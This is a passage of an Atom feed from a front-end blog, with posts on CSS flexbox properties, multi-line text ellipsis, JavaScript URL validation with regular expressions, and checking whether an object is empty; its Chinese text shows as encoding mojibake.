  <span class="attribute">flex-basis</span>: &lt;length&gt; | auto; <span class="comment">/* default set to auto */</span></div><div class="line">    <span class="comment">/* é€Ÿå†™æ³• */</span></div><div class="line">    flex: none | [ &lt;&amp;#39;flex-grow&amp;#39;&gt; &lt;&amp;#39;flex-shrink&amp;#39;&gt;? || &lt;&amp;#39;flex-basis&amp;#39;&gt; ];</div><div class="line">    <span class="comment">/* è‡ªæ’åˆ— */</span></div><div class="line">    align-self: auto | flex-start | flex-end | center | baseline | stretch;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ‰ä¸€ä¸ªå®¹å™¨ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;container&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;item&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;item&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;item&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;item&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;item&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;item&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="CSS" scheme="http://youngdze.co/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>CSS é™åˆ¶å¤šè¡Œä¸ºçœç•¥å·</title>
    <link href="http://youngdze.co/2015/08/27/css-line-clampin/"/>
    <id>http://youngdze.co/2015/08/27/css-line-clampin/</id>
    <published>2015-08-27T08:12:06.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>ç°åœ¨æœ‰å¦‚ä¸‹ HTMLï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"module"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Vestibulum tortor quam, feugiat vitae, ultricies eget, tempor sit amet, ante. Donec eu libero sit amet quam egestas semper. Aenean ultricies mi vitae est. Mauris placerat eleifend leo.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure><p>è®¾ç½®å¤šè¡Œé™åˆ¶ä¸ºçœç•¥å·å¦‚ä¸‹ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.module</span> &#123;</div><div class="line">    <span class="attribute">width</span>: <span class="number">250px</span>;</div><div class="line">    <span class="attribute">overflow</span>: hidden;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-class">.line-clamp</span> &#123;</div><div class="line">    <span class="attribute">display</span>: -webkit-box;</div><div class="line">    <span class="attribute">-webkit-line-clamp</span>: <span class="number">3</span>;</div><div class="line">    <span class="attribute">-webkit-box-orient</span>: vertical;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>è®¾ç½®å®½åº¦é™åˆ¶ä¸ºçœç•¥å·å¦‚ä¸‹ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.module</span> &#123;</div><div class="line">    <span class="attribute">width</span>: <span class="number">250px</span>;</div><div class="line">    <span class="attribute">white-space</span>: nowrap;</div><div class="line">    <span class="attribute">overflow</span>: hidden;</div><div class="line">    <span class="attribute">text-overflow</span>: ellipsis;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ç°åœ¨æœ‰å¦‚ä¸‹ HTMLï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div 
      
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="CSS" scheme="http://youngdze.co/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript åˆ¤æ–­ URL</title>
    <link href="http://youngdze.co/2015/08/27/javascript-isurl/"/>
    <id>http://youngdze.co/2015/08/27/javascript-isurl/</id>
    <published>2015-08-27T06:36:27.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> URL_REGEXP = <span class="regexp">/^(http|ftp|https):\/\/[\w\-_]+(\.[\w\-_]+)+([\w\-\.,@?^=%&amp;:/~\+#]*[\w\-\@?^=%&amp;/~\+#])?$/</span>;</div><div class="line"><span class="keyword">var</span> url = <span class="string">"https://g.taobao.com/brand_detail.htm?navigator=all&amp;_input_charset=utf-8&amp;q=%E7%94%B7%E5%A3%AB%E8%A1%AC%E8%A1%AB%E8%8B%B1%E4%BC%A6%E6%AC%BE&amp;spm=5148.1292865.a31d2.2.NiXIQv"</span>;</div><div class="line">URL_REGEXP.test(url);    <span class="comment">// true</span></div></pre></td></tr></table></figure><a id="more"></a><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// æ¥è‡ª stackoverflow</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">ValidURL</span>(<span class="params">str</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> pattern = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'^(https?:\/\/)?'</span>+ <span class="comment">// protocol</span></div><div class="line">    <span class="string">'((([a-z\d]([a-z\d-]*[a-z\d])*)\.)+[a-z]&#123;2,&#125;|'</span>+ <span class="comment">// domain name</span></div><div class="line">    <span class="string">'((\d&#123;1,3&#125;\.)&#123;3&#125;\d&#123;1,3&#125;))'</span>+ <span class="comment">// OR ip (v4) address</span></div><div class="line">    <span class="string">'(\:\d+)?(\/[-a-z\d%_.~+]*)*'</span>+ <span class="comment">// port and path</span></div><div class="line">    <span class="string">'(\?[;&amp;a-z\d%_.~+=-]*)?'</span>+ <span class="comment">// query string</span></div><div class="line">    <span class="string">'(\#[-a-z\d_]*)?$'</span>,<span class="string">'i'</span>); <span class="comment">// fragment locater</span></div><div class="line">    <span class="keyword">if</span>(!pattern.test(str)) &#123;</div><div class="line">    alert(<span class="string">"Please enter a valid URL."</span>);</div><div class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>å‚è€ƒ</p><ul><li><a href="http://stackoverflow.com/questions/5717093/check-if-a-javascript-string-is-an-url" target="_blank" rel="external">Check if a Javascript string is an url</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; URL_REGEXP = &lt;span class=&quot;regexp&quot;&gt;/^(http|ftp|https):\/\/[\w\-_]+(\.[\w\-_]+)+([\w\-\.,@?^=%&amp;amp;:/~\+#]*[\w\-\@?^=%&amp;amp;/~\+#])?$/&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; url = &lt;span class=&quot;string&quot;&gt;&quot;https://g.taobao.com/brand_detail.htm?navigator=all&amp;amp;_input_charset=utf-8&amp;amp;q=%E7%94%B7%E5%A3%AB%E8%A1%AC%E8%A1%AB%E8%8B%B1%E4%BC%A6%E6%AC%BE&amp;amp;spm=5148.1292865.a31d2.2.NiXIQv&quot;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;URL_REGEXP.test(url);    &lt;span class=&quot;comment&quot;&gt;// true&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="JavaScript" scheme="http://youngdze.co/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript åˆ¤æ–­å¯¹è±¡æ˜¯å¦ä¸ºç©º</title>
    <link href="http://youngdze.co/2015/08/05/javascript-is-empty/"/>
    <id>http://youngdze.co/2015/08/05/javascript-is-empty/</id>
    <published>2015-08-05T07:35:25.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>æ¥è‡ªï¼š<a href="http://stackoverflow.com/questions/4994201/is-object-empty" target="_blank" rel="external">Is object empty?</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Speed up calls to hasOwnProperty</span></div><div class="line"><span class="keyword">var</span> hasOwnProperty = <span class="built_in">Object</span>.prototype.hasOwnProperty;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span>(<span class="params">obj</span>) </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">// null and undefined are "empty"</span></div><div class="line">    <span class="keyword">if</span> (obj == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line"></div><div class="line">    <span class="comment">// Assume if it has a length property with a non-zero value</span></div><div class="line">    <span class="comment">// that that property is correct.</span></div><div class="line">    <span class="keyword">if</span> (obj.length &gt; <span class="number">0</span>)    <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    <span class="keyword">if</span> (obj.length === <span class="number">0</span>)  <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line"></div><div class="line">    <span class="comment">// Otherwise, does it have any properties of its own?</span></div><div class="line">    <span class="comment">// Note that this doesn't handle</span></div><div class="line">    <span class="comment">// toString and valueOf enumeration bugs in IE &lt; 9</span></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> obj) &#123;</div><div class="line">        <span class="keyword">if</span> (hasOwnProperty.call(obj, key)) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>underscore.js å¯¹æ­¤æœ‰ä¸“é—¨çš„å‡½æ•°åˆ¤æ–­ï¼Œä¸º <code>_.isEmpty()</code>ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æ¥è‡ªï¼š&lt;a href=&quot;http://stackoverflow.com/questions/4994201/is-object-empty&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Is object empty?&lt;/a&gt;&lt;/p&gt;
&lt;figure c
      
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="JavaScript" scheme="http://youngdze.co/tags/JavaScript/"/>
    
  </entry>
  
</feed>
